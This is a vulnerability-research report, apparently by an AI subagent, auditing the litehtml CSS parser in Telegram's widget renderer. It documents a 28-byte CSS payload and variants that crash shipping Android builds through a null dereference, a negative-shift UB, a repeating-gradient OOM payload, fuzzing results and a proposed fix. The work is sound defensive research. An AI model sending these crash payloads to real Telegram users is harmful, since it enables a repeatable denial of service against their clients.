# LiteHTML CSS hunt — Telegram Android `libtmessages.49.so` (72889) + iOS twidget fork

Date: 2026-11-08.  Subagent: CSS split of the lib hunt.
Scope: litehtml CSS parser / tokenizer / value parsers / `css_properties::compute` / shorthand and
selector paths.  Explicitly **not** HTML layout, canvas, DOM, SVG, images, Lottie, fonts.
Constraints honoured: **host-only** — no device, no Frida, no bot, no network.  The Pixel is
crash-log-only, the iPhone and the Sony were not touched.  Evidence preserved; no shared notes edited.

Sources used (all local):
- Telegram's vendored litehtml fork (twidget `b5878f9` + Telegram VENDOR edits):
  `lab/qjs_fork_audit/tgwidget-src/third-party/twidget/LiteHTML/litehtml/` (with `VENDOR.md`, 2,534 lines,
  84 numbered hardening edits).
- Upstream litehtml (v0.10-52-gab7caef1, 2026-11-02): `lab/qjs_fork_audit/litehtml/` (git history, 1,080 commits).
- Android 13.2.1 (72889) native library and its annotated IDB:
  `<HOME>/ailocal/Telegram/.scratch_beta1320/lib/arm64-v8a/libtmessages.49.so`,
  `<HOME>/ailocal/Telegram/.opencode/idbs/libtmessages_49_arm64_widget_annotated.i64`.
- Android 13.2.2 (72929) native library:
  `lab/qjs_fork_audit/zeroday_hunt_parser/device/updates/72929/lib/libtmessages.49.so`.

Artifacts:
- `lab/lib_hunt_css/src/` — host driver, fuzz target, IDA scripts.
- `lab/lib_hunt_css/build.sh` (ASAN/UBSAN/plain), `build_fuzz.sh` (coverage build of the CSS TUs).
- `lab/lib_hunt_css/corpus/poc/` — the triggers below.
- `lab/lib_hunt_css/logs/` — ASAN/UBSAN output, fuzz log, IDA decompilation logs.

---

## 1. Findings

| # | Class | Where | Trigger | Status | Severity |
|---|---|---|---|---|---|
| CSS-01 | **Null-pointer dereference** (CWE-476), invalid read at `null + 0x335` on arm64 | `css_properties::compute_font`, `src/css_properties.cpp:605` (bolder) / `:620` (lighter) | `font-weight:bolder` (or `lighter`) computed on the **root element** — 28-byte payload | **new, unreported**, present in upstream litehtml v0.10 and in Telegram's fork; binary-confirmed in 72889 | DoS (crash of the render path); no controllable primitive |
| CSS-02 | **UB: negative shift** (`1 << (idx-1)` with `idx == 0`) | `style::parse_text_decoration_line`, `src/style.cpp:2325`; same pattern at `:2377` (`parse_text_emphasis_position`) | `text-decoration:none` / `text-decoration-line:none` | new, unreported; UBSAN-confirmed; no memory corruption | robustness (wrong bit value; miscompile risk) |
| CSS-03 | **n-day: infinite loop / OOM** in `repeat_color_points` (repeating gradient, zero/NaN period) | `src/background.cpp:762`, missing upstream fix `ead904b7` (2026-10-31) | e.g. `background:repeating-linear-gradient(45deg,red 0 10px,blue 10px 20px)` | already reported by this project (`TRIAGE_20261107.md`, `poc_gradient_repeat_oom_20261107.html`); re-confirmed here that the fix is absent from the fork | DoS (OOM) |

No heap buffer overflow / UAF / OOB write was found in the CSS path in this pass (§6 lists what was
audited and cleared, §7 the fuzz campaign and its negative result).

---

## 2. CSS-01 — root-element relative `font-weight` dereferences a null parent

### 2.1 Defect

`css_properties::compute_font` computes the used value of a relative `font-weight` from the **parent
element's** computed style and does not check that the element has a parent:

```cpp
// src/css_properties.cpp (fork = upstream v0.10 text; line 605 in the fork)
case font_weight_bolder:
    const int inherited = static_cast<int>(el->parent()->css().m_font_weight.val());
// line 620: same in font_weight_lighter
```

`element::parent()` is `m_parent.lock()` (`html_tag.h`), i.e. **null for the document's root element**
(`<html>` built by `document::createFromString` / `finalize_from_external_root`).  Every element's
`compute_styles()` calls `m_css.compute(this, doc)` unguarded (`html_tag.cpp:1084`), including the root
(`document.cpp:2004`), so a cascade that gives the root a relative `font-weight` crashes at document
build time — before any layout or drawing.

Other parent accesses in the same function (`compute_font`'s text-emphasis block, text shadows) are
guarded with `if(el->parent())`; the two font-weight branches are the only unguarded ones
(`grep "parent()->css()" src/css_properties.cpp` — lines 104, 555, 581-593, 681 are guarded).

### 2.2 Minimal trigger (CSS only, 28 bytes)

```html
<style>*{font-weight:bolder}
```

Equivalent triggers (all verified, `lab/lib_hunt_css/corpus/poc/`):
- `<style>html{font-weight:bolder}` (31 B)
- `<style>:root{font-weight:lighter}` (32 B)
- `<html style="font-weight:bolder">`
- through a media query or `!important`: `@media (min-width:1px){html{font-weight:bolder!important}}`
- through the `font` shorthand: `html{font:italic bolder 12px/1.5 x}`
- `lighter` hits the second site.

A later declaration that overrides the value (`html{font-weight:bolder;font-weight:400}`) suppresses
the crash because only the cascaded value is read — this is the used-value path, not the parser.

### 2.3 Host proof (ASAN + UBSAN)

Built with `build.sh asan` (clang 19, `-fsanitize=address,undefined`, the exact vendored sources):

```
$ ./out/asan/driver html corpus/poc/min1.html
css_properties.cpp:605:70: runtime error: member call on null pointer of type 'litehtml::element'
AddressSanitizer:DEADLYSIGNAL
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
The signal is caused by a READ memory access. Hint: address points to the zero page.
 #0 litehtml::css_properties::compute_font(...)      css_properties.cpp
 #1 litehtml::css_properties::compute(...)           css_properties.cpp:189
 #2 litehtml::html_tag::compute_styles(bool)         html_tag.cpp:1084
 #3 litehtml::document::finalize_from_external_root  document.cpp:2004
 #4 litehtml::document::createFromString             document.cpp:109
```

The crash is deterministic and happens during `createFromString` (no `render()` needed; the driver
prints `doc=...` only after creation).  It is a real SIGSEGV (ASAN reports the hardware fault), not a
sanitizer artifact — see the plain (non-sanitizer) build in §2.6.

UBSAN independently names the defect: *member call on null pointer of type `litehtml::element`*.

### 2.4 Android binary evidence (13.2.1 / 72889)

The library is stripped, so the function was located through its unique string reference:
`litehtml::css_properties::compute_font` is the only function referencing `"monospace"`
(`0x273fc2` → xref at `0x7cfe0c`), i.e. **`sub_7CF98C`** in
`libmessages_49_arm64_widget_annotated.i64`.  It is called from `sub_7CE094`
(`css_properties::compute`, call at `0x7ce6e0`), whose callers are `sub_85593C`
(`html_tag::compute_styles`) and the per-element `compute_styles` overrides — the same call graph as
the source.

Hex-Rays of the bolder branch (`lab/lib_hunt_css/logs/ida_font3.log`) — the parent lock result is
tested, but **the null path jumps into the dereference anyway**:

```c
LABEL_195:
  if ( *(_BYTE *)(a1 + 733) == 0 ) goto LABEL_240;   // m_font_weight not predefined
  v114 = *(_DWORD *)(a1 + 728);                       // predef value
  if ( v114 == 2 ) {                                  // font_weight_bolder
      v115 = *(_QWORD *)(a2 + 32);                    // el->m_parent control block
      if ( v115 != 0 ) {
          v116 = sub_169EAC8(v115);                   // weak_ptr::lock
          if ( v116 != nullptr ) {
              v117 = *(_QWORD *)(a2 + 24);            // parent element
LABEL_215:
              v125 = 0.0;
              if ( *(_BYTE *)(v117 + 821) == 0 ) {    // <-- read at v117+821; v117 == 0 here
                  v125 = *(float *)(v117 + 816);      //     when there is no parent
```

When `el->parent()` is null, `v115 == 0`, `v116 = nullptr`, `v117 = 0`, and control reaches
`LABEL_215` which reads `*(uint8_t *)(0 + 821)` — a fault at address **0x335** on arm64.  This is
exactly the host crash, in the shipped Android code.

The raw instruction sequence at the null path (`logs/…`, reproduced by `src/scan_compute_font.py`):

```
0x7d0518: cbz  x0, 0x7d0534        ; parent lock failed / no parent
0x7d051c: ldr  x8, [x23, #0x18]    ; parent element
0x7d0534: mov  x8, xzr             ; <- null path lands here
0x7d0538: movi d9, #0
0x7d053c: ldrb w9, [x8, #0x335]    ; <- reads 0x335 when x8 == 0
```

**13.2.2 (72929)** — the same signature is present in the 72929 library
(`lab/qjs_fork_audit/zeroday_hunt_parser/device/updates/72929/lib/libtmessages.49.so`,
`src/scan_compute_font.py`): `ldrb w9, [x8, #0x335]` at `0x7d90cc`, with the identical
`cbz x0 → mov x8, xzr → ldrb` null path (`cbz` at `0x7d90a8`, `mov x8, xzr` at `0x7d90c4`).  Both
shipped betas carry the bug.

### 2.5 Domain, MTE, iOS

- **Domain**: not a heap access.  Faulting address is the zero page (`0x335`), i.e. **tag 0**; Scudo
  tagged C++ heap vs arena tag-0 do not apply.  No allocator involvement, no controlled data.
- **MTE**: irrelevant — a null-page fault is synchronous regardless of MTE; MTE tags the heap, not
  address 0 (and `mmap_min_addr` prevents mapping page 0 for an untrusted app).
- **iOS/macOS (twidget `LiteHTML` + `LiteHTML/core`)**: the same fork source contains the same
  unguarded code, and twidget builds `<html>` as the root the same way, so the defect is present.
  Reachability on iOS additionally depends on the WidgetRuntime validator (policy.md §5 rewrites CSS
  before litehtml parses).  `font-weight` is an ordinary property that the iOS widget CSS path
  supports; the exact allowlist was not tested here (iPhone untouched by instruction).  **Treat iOS as
  present-by-source, reachability unverified.**
- **Android reachability**: the Android widget pipeline parses attacker HTML/CSS natively in the same
  library (`twlite::Container` implements `litehtml::document_container`, see
  `notes/twidget_native_audit.md` §5) and the VENDOR notes state the native runtime has **no
  validator in front of litehtml**: sheets, `style=` attributes and every attribute litehtml parses as
  CSS reach the parser directly.  `<style>` sheets are a supported widget feature.

### 2.6 Plain (non-sanitizer) build

`build.sh plain` links the same sources without any sanitizer (`out/plain/driver`, `-O2`); run against
the 28-byte payload it terminates with SIGSEGV, exit 139, with no sanitizer involved:

```
$ ./out/plain/driver html corpus/poc/min3.html
Segmentation fault (core dumped)          # exit 139
$ ./out/plain/driver html corpus/poc/benign.html
OK 48                                     # exit 0: a normal widget renders fine
```

Log: `logs/poc_min3_plain.log`.  This proves the crash is a real hardware fault in the compiled code,
not a sanitizer artifact.

### 2.7 Primitive and endgame

- **Primitive**: none beyond a deterministic crash.  The read is at a constant address derived from a
  null base; nothing is written and no attacker data is used as an address.  Not exploitable for
  memory corruption.
- **Endgame (DoS)**: a single widget whose HTML is `<style>*{font-weight:bolder}` crashes the render
  path on document build.  A widget message is persistent chat content: every render of the message
  (opening the chat, receiving it, scrolling it back into view, restarting the app on that chat)
  re-parses the HTML and crashes again — a repeatable, zero-interaction availability attack against
  Telegram on Android, and by source also on macOS/iOS if the validator does not rewrite
  `font-weight`.  No user data is read or written; no persistence beyond the message itself.
- **Why it matters despite being "only" a null deref**: it is an unreported 0-day memory-safety bug
  in the CSS compute path of the widget renderer, reachable from 28 bytes of CSS, on the shipping
  Android build (binary-verified), and it is *not* covered by any of the fork's 84 hardening edits.

### 2.8 Fix

Guard the relative weight branches (`el->parent()` null → use the initial weight, as the computed
`font-weight:normal` path does), e.g. `const int inherited = el->parent() ?
(int)el->parent()->css().m_font_weight.val() : 400;`.  This is a one-line change in both branches; the
upstream project should be told (the bug is upstream litehtml v0.10, not a Telegram regression).

---

## 3. CSS-02 — negative shift in `text-decoration-line` / `text-emphasis-position`

`style::parse_text_decoration_line` (and `parse_text_emphasis_position`) turn a keyword into a bit:

```cpp
auto idx = css_values(style_text_decoration_line_strings).value_index(token.ident());
if(idx.has_value())
    val |= 1 << (idx.value() - 1);        // idx == 0 for "none"  ->  1 << -1
```

`style_text_decoration_line_strings = {"none","underline","overline","line-through"}`, so
`text-decoration: none` or `text-decoration-line: none` evaluates `1 << -1` — UBSAN:

```
style.cpp:2325:30: runtime error: shift exponent -1 is negative
```

Reachable from any stylesheet (`p{text-decoration:none}`) — extremely common CSS.  On arm64/x86 the
shift is masked (1 << 31), so the value becomes a negative int bitmask instead of 1; no memory access
depends on it in a way that was found to be unsafe, and it does not corrupt memory.  The same pattern
is at `style.cpp:2377` for `text-emphasis-position` when the index is 0.

Impact: wrong used value (and a miscompile hazard under `-fstrict-enums`-style assumptions); worth
fixing, but **not** a memory-corruption primitive.  `val |= 1 << (idx.value() - 1)` should use the
enumerator's own bit (`text_decoration_line_none` is 0, i.e. `none` must clear the mask).

---

## 4. CSS-03 — n-day: `repeat_color_points` infinite loop / OOM (already known)

Upstream litehtml fixed `repeat_color_points` on 2026-10-31 (`ead904b7`, "Infinite loop/OOM in
repeating gradients with zero period"): it now returns on `color_points.size() < 2` and on a
non-positive/non-finite period.  The Telegram fork predates that commit and does **not** contain the
guard (`src/background.cpp:762-795`), so a repeating gradient whose stop period is zero/NaN grows
`color_points` without bound at draw time.

This was already found and triaged by this project (`lab/qjs_fork_audit/TRIAGE_20261107.md` §"OOM
artifacts are one bug: repeating-gradient expansion", reproducer
`lab/qjs_fork_audit/poc_gradient_repeat_oom_20261107.html`); it is logged here as an **n-day** so the
CSS hunt record is complete — not claimed as new.  Same class of fix as CSS-01 in the sense that it is
an upstream commit the fork never merged.

---

## 5. Non-findings worth recording

- **UBSAN "load of value N, which is not a valid value for type `string_id`"** (html_tag.cpp:867 and
  throughout the fuzz log).  `string_id` is an enum but `_id()` interns arbitrary property/tag names,
  producing enumerators outside the declared range.  This is by design in this code base; it is
  technically UB and a compiler could exploit the range assumption, but no misbehaviour was observed.
  Recorded as a robustness note, **not** a bug claim.
- The fork's hardening edits (VENDOR.md 14 = component depth 64, 15 = list caps, 33 = revert, 21 =
  style byte budget, 56/60/66/79/80) were read in the CSS files; no bypass that leads to memory
  corruption was found.  See §6 for the audited sites.

---

## 6. What was audited and cleared (static)

All against the fork source (`.../LiteHTML/litehtml/src`), line references are the fork's:

- `css_tokenizer.cpp` (853 L): every `str[index]`/`str[index+1]` read is at or before the trailing NUL
  (`std::string::operator[]` is valid at `size()`); `consume_number`'s `str[index+2]` is guarded by
  the `lowcase(str[index])=='e' && is_one_of(str[index+1],...)` short-circuit; escapes are bounded to
  6 code points; `consume_url_token`/`consume_remnants_of_bad_url` terminate on `)`/EOF.
- `css_parser.cpp` (714 L): `next_token`/`peek_token` bound-check; `consume_simple_block` /
  `consume_function` recurse only under `m_depth < max_component_depth` (edit 14) and `skip_block`
  is iterative; `slice()` uses are in-bounds (`grid-template` requires `slash+1 < size`,
  `border-radius` slice at `i+1 <= size`, `@import` slice at `index+1 <= size`,
  `:nth-child(... of S)` slice at `i+1 <= size`); `get_repr` with `count == -1`.
- `style.cpp` (3020 L): `parse_1234_values` rejects `>4`; `add_four_properties`'s index arithmetic
  (`val[n>1]`, `val[n/3*2]`, `val[n/2+n/4]`) was checked for n = 1..4; `cap_list_value` /
  `keep_comma_groups` / `cap_function_arguments` cut only inside the vector; the `#if 0`-style
  `repeat_color_points` n-day noted above; `subst_vars`/`resolve_vars` splice with
  `remove()`+`insert()` at `i <= size`, recursion bounded (32) and cycle-checked; the fast-path
  `split_declarations` maintains depth/quotes without indexing.
- `gradient.cpp` (659 L): colour-stop list requires ≥2 groups, `parse_color_hint` consumes only a
  single token, the 2-position colour stop pushes two entries, `max_css_list` truncation is guarded by
  `size > max`; `parse_radial_size`/`parse_gradient_position` use `at()` (returns a default token);
  `1 << x.predef()` where predef ∈ [0,4].
- `css_effects.cpp` (1156 L): `parse_clip_path` builds `values` with fixed sizes before
  `clip_path_shape::resolve` reads `values[0..4]` (inset 4/5, circle 3, ellipse 4, polygon even and
  ≥6); `parse_transform` / `parse_filter` / `parse_box_shadow` use `function_args` which rejects empty
  argument lists before `args[0]`; `calc_*` recursion depth 16 and `max_nodes`; all lengths are
  `std::isfinite`-checked before use (Telegram additions).
- `css_properties.cpp` (1170 L): font-size table indexed only after `idx_in_table ∈ [0,7]` and
  `predef ∈ [xx_small, xx_large]`; `bound_inherited_string` cuts at ≤1024 with `value[cut]` valid for
  `size > 1024`; the CSS-01 defect is the one unguarded parent access; all `get_property<T>` go
  through the type-checked template.
- `css_selector.cpp` (888 L): `parse_an_b` uses `s.find`/`substr` (no raw indexing beyond `str_b[1]`
  when `str_b` is one character, valid at the NUL); `generated_part_selector` computes the `assign`
  range before `erase`; `parse_complex_selector` requires full consumption.
- `media_query.cpp` (901 L): `parse_mf_value`/`parse_mf_range` use `at()` and an end check before
  every `val[0]`/`val[1]`; `media_condition::check`'s `_not_` always has exactly one child from the
  parser.
- `web_color.cpp` (632 L), `strtod.cpp` (268 L), `num_cvt.cpp` (130 L), `url.cpp` (227 L): no
  indexable structure from attacker data; `parse_hash_color` requires length ∈ {3,4,6,8} before
  `s[0..7]`; `url::decode` checks `i + 2 < size` (its `>=` comparison would also allow `i+2 == size`
  only to break, which is safe).

## 7. Fuzz campaign (host, small)

Harness `src/fuzz_css_doc.cpp`: the input is CSS, embedded into a fixed widget-like document
(`<style>…</style>` + a body with class/id/`style=` targets using the properties in scope), parsed by
`document::createFromString`, laid out at 300 px, and — for odd first bytes — drawn (`document::draw`)
so the background/gradient/filter/clip-path value consumers run.  Build `build_fuzz.sh` instruments
the 15 CSS translation units with libFuzzer coverage and links the rest of the fork from the ASAN
build.

Result (log `logs/fuzz_css_doc.log`, 2026-11-08):

- **`Done 84306 runs in 361 second(s)`**, ~210-300 exec/s, peak RSS ~532 MB, corpus grew to ~1,870
  inputs / 1.0 MB; coverage ~12,245 edges / ~40,280 features (instrumented CSS TUs).
- **0 ASAN reports, 0 timeouts, 0 artifacts** (`out/fuzz/artifacts/` is empty).
- The only non-ASAN reports were the `string_id` UBSAN notes of §5; `text-decoration: none` (CSS-02)
  was not reached by the seeds in this run (the seed corpus avoids `none` on purpose, to keep the log
  clean; it reproduces in one command, §8).
- Known limitation: the gradient OOM (CSS-03) is a slow growth; it did not reproduce in 360 s with
  these seeds because the input must contain a *repeating* gradient with a zero/NaN stop period.

A 361 s / 84 k-exec run is a smoke test, not a bug-finding campaign; §9 is the heavy plan for
approval.

## 8. Reproduction

```sh
cd <HOME>/ailocal/Telegram/telegramandroidwidget/lab/lib_hunt_css
./build.sh asan                     # clang 19, ASAN+UBSAN over the vendored sources
./out/asan/driver poc               # CSS-01 (font-weight:bolder on <html>)
./out/asan/driver html corpus/poc/min1.html      # CSS-01, 31-byte form
./out/asan/driver html corpus/poc/min3.html      # <- the 28-byte form: <style>*{font-weight:bolder}
./out/asan/driver html corpus/poc/td_none.html   # CSS-02 UBSAN shift report
./build.sh plain && ./out/plain/driver html corpus/poc/min3.html    # SIGSEGV, exit 139 (no sanitizer)
./out/plain/driver html corpus/poc/benign.html                      # control: OK 48, exit 0
cat logs/fuzz_css_doc.log | tail                 # fuzz campaign result: Done 84306 runs in 361 s
```

Binary check (already logged): `logs/ida_font2.log`, `logs/ida_font3.log`, `logs/ida_names.log`
(IDA 9.4 idalib, IDB `libmessages_49_arm64_widget_annotated.i64`, input
`.scratch_beta1320/lib/arm64-v8a/libtmessages.49.so`, 13.2.1 / 72889), and
`src/scan_compute_font.py <lib>` (capstone scan for the `ldrb [x?, #0x335]` null path; run against
both the 72889 and the 72929 library — both show it).

## 9. Heavy fuzzing plan — **requires orchestrator approval** (not started)

Nothing heavy was started in this session.  For approval, the exact plan:

1. **Target A — document-level CSS (as §7), 2 cores × 24 h.**
   Binary: `out/fuzz/fuzz_css_doc`, `-max_total_time=43200 -timeout=10 -rss_limit_mb=3072
   -max_len=32768`, corpus = the §7 corpus + the 3 CSS seeds + `tests/css_*` inputs (≈1.7k files,
   ~1 MB); memory ≤ 3 GB, expected ~15-20 M execs.  Purpose: parser/cascade/compute/draw memory
   safety with structure; the current 28-60 k execs are only a smoke test.
2. **Target B — `style::add` declaration fuzzer, 2 cores × 12 h.**
   New harness feeding one declaration at a time into `style::add` + `subst_vars` with a real
   `html_tag` (a `<div style="…">` with custom properties), to stress shorthand expansion, `var()`
   splicing and the caps (edit 15/21).  Same flags; corpus = the value-parser corpus
   (`artifacts_css_parsers` timeout artifacts excluded) + generated shorthand pairs.
3. **Target C — selector/media/stylesheet fuzzer, 2 cores × 12 h.** Text = a stylesheet; a fixed
   document with ids/classes/attrs/pseudo-classes.  Stress `parse_selector_list`,
   `is_nth_child`/`is_nth_last_child`, `media_query` evaluation, `@layer/@supports`.
4. **Target D — differential fuzz vs upstream v0.10 (2 cores × 12 h).** Same input into the fork and
   upstream (both already built), compare parse acceptance and computed values; divergences are
   candidate fork regressions (edits are insertions-only, so a behavioural divergence is a finding).
5. **Gradient OOM (CSS-03) as a separate bounded check:** replay-only, `-rss_limit_mb=1024`, to
   measure the growth rate on the current build; no long run (it is a known n-day).
6. Budget: ~8 cores × ~1 day, ≤ 3 GB per worker, artifacts to `lab/lib_hunt_css/out/<target>/artifacts`.
   Stop rule: any ASAN report, any timeout artifact, or 24 h without new coverage.

The Pixel (crash-log-only) does not need to be involved for any of this; if a candidate survives, the
orchestrator decides the live test.

## 10. Approved long campaign (single worker) — started 2026-11-08 03:10 CET

Orchestrator approval: 1 CSS worker (the other 2 belong to the litehtml agent), ≤3 GiB RSS,
`-timeout=5`, seeded.  Launched (survives this session, `setsid nohup`):

```
env ASAN_OPTIONS=abort_on_error=0:detect_leaks=0:allocator_may_return_null=1 \
    UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=0 \
  ./out/fuzz/fuzz_css_doc -max_total_time=43200 -timeout=5 -rss_limit_mb=2048 \
     -max_len=32768 -artifact_prefix=out/fuzz/artifacts/ -print_final_stats=1 \
     out/fuzz/corpus
```

- PID 1239363, single process (no `-jobs`/`-workers`), parent 1239360 (`setsid` wrapper).
- Seed corpus: 1,898 files / 1.09 MB (the §7 accumulated corpus + the three CSS seeds).
- RSS cap 2,048 MB (below the 3 GiB hard limit); observed ~0.55 GB at 18 k execs.
- ASAN kills → `out/fuzz/artifacts/`; UBSAN reports are non-fatal and dominated by the
  `string_id` out-of-enum note of §5 (`halt_on_error=0`, `print_stacktrace=1`).
- Log: `logs/fuzz_css_doc_campaign.log`.

Early stats (03:11:36, ~1 min): 18,540 execs, 325 exec/s, cov 12,369 / ft 41,114, corpus 1,427
files / 746 KB, RSS 548 MB, **0 artifacts**.

Mid-run stats (03:15:07, 4m35s): 85,119 execs, 310 exec/s, cov 12,531 / ft 44,525, corpus 1,831
files / 977 KB, RSS 593 MB, **0 artifacts**, 56 UBSAN `string_id` notes (deduplicated by location),
single process (only `llvm-symbolizer` as a child).

Checkpoint (03:18:54, 8m16s): 146,960 execs, 296 exec/s, cov 12,604 / ft 46,311, corpus 2,063
units / 1,097 KB (3,322 files on disk), RSS 601 MB, **0 artifacts**, log 564 KB.  No timeout, no
ASAN report; the only UBSAN output remains the `string_id` enum note.

Checkpoint (03:23:22, 12m44s): 216,734 execs, 284 exec/s, cov 12,680 / ft 47,780, corpus 2,262
units / 1,182 KB, RSS 601 MB, **0 artifacts**, log 676 KB.  Still one worker, no ASAN report and no
timeout; coverage is still climbing (+76 edges, +1,469 features since the previous checkpoint).

The run is bounded at 12 h (`-max_total_time=43200`) and will be stopped earlier if a slot is needed
or an artifact appears.  The other targets (B, C, D of §9) are **not** started.

## 11. Honest assessment

- CSS-01 is a real, unreported memory-safety defect (invalid read through a null pointer) in the
  shipped CSS compute path, verified on the host and in the 72889 binary, with a 28-byte CSS trigger.
  It gives a reliable crash, **not** a controllable primitive; it is a DoS, and the endgame in §2.7 is
  the realistic one.
- CSS-02 is UB without memory impact; CSS-03 is a known n-day of this project.
- No heap buffer overflow, UAF, or OOB write was found in the CSS parser/value/compute/shorthand/
  selector path in this pass.  The heavy plan in §9 is what would be needed to make a stronger claim
  either way; the 6-minute campaign reported here is a smoke test.
